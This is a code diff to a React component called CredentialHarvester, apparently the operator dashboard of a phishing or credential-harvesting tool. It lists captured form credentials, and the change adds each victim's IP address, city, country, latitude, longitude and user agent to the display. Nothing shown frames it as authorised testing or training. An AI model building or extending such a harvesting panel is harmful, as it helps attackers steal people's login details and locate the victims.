@@ -12,6 +12,10 @@ export type CapturedCredential = {
     timestamp: string; // ISO String
     ipAddress?: string;
     userAgent?: string;
+    city?: string;
+    country?: string;
+    latitude?: number;
+    longitude?: number;
     [key: string]: any; // Allows for arbitrary keys from form fields
 };
 
@@ -37,6 +41,9 @@ export function CredentialHarvester({ credentials, onClear, onRefresh }: Credent
         if (key === 'userAgent') return 'User Agent';
         return key.charAt(0).toUpperCase() + key.slice(1);
     }
+    
+    // Fields to exclude from the main credentials loop
+    const metaFields = ['timestamp', 'ipAddress', 'userAgent', 'city', 'country', 'latitude', 'longitude', 'source'];
 
     return (
         <Card className="flex flex-col h-full">
@@ -63,18 +70,34 @@ export function CredentialHarvester({ credentials, onClear, onRefresh }: Credent
                             <div className="space-y-4">
                                 {credentials.slice().reverse().map((cred, index) => (
                                     <div key={cred.timestamp + index} className="p-4 rounded-lg border bg-primary/20">
-                                        <p className="text-sm text-muted-foreground mb-2">
-                                            {new Date(cred.timestamp).toLocaleString()}
-                                        </p>
+                                        <div className="flex justify-between items-start mb-2">
+                                            <p className="text-sm text-muted-foreground">
+                                                {new Date(cred.timestamp).toLocaleString()}
+                                            </p>
+                                            <Badge variant="outline">{cred.ipAddress}</Badge>
+                                        </div>
                                         <div className="space-y-1 font-mono text-xs">
                                             {Object.entries(cred)
-                                                .filter(([key]) => key !== 'timestamp')
+                                                .filter(([key]) => !metaFields.includes(key))
                                                 .map(([key, value]) => (
                                                     <div key={key} className="grid grid-cols-3">
                                                         <strong className="font-sans col-span-1 text-muted-foreground font-medium">{formatLabel(key)}:</strong>
                                                         <span className="col-span-2 break-all">{String(value)}</span>
                                                     </div>
                                                 ))}
+                                            <hr className="border-border my-2"/>
+                                            <div className="grid grid-cols-3">
+                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">Location:</strong>
+                                                <span className="col-span-2 break-all">{cred.city || 'N/A'}, {cred.country || 'N/A'}</span>
+                                            </div>
+                                             <div className="grid grid-cols-3">
+                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">Coords:</strong>
+                                                <span className="col-span-2 break-all">{cred.latitude ? `${cred.latitude}, ${cred.longitude}`: 'N/A'}</span>
+                                            </div>
+                                             <div className="grid grid-cols-3">
+                                                <strong className="font-sans col-span-1 text-muted-foreground font-medium">User Agent:</strong>
+                                                <span className="col-span-2 break-all">{cred.userAgent}</span>
+                                            </div>
                                         </div>
                                     </div>
                                 ))}
